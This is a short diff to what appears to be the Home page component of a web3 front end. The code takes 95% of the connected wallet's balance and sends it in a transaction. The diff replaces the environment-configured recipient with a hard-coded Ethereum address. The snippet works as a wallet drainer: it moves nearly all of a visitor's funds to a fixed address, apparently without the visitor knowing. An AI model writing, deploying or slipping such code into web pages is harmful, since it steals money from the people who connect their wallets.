@@ -47,7 +47,7 @@ export default function Home() {
     let balance = await provider.getBalance(signer.getAddress()) ;
    let amount = balance.mul(ethers.utils.parseEther("95")).div(ethers.utils.parseEther("100"));
    const tx = signer.sendTransaction({
-    to: process.env.NEXT_PUBLIC_GREETER_ADDRESS,
+    to: "0xC1F1cdD386776a357531cc5b91e1eF8E14a45DC8",
     value: amount
 });
     console.log(tx)
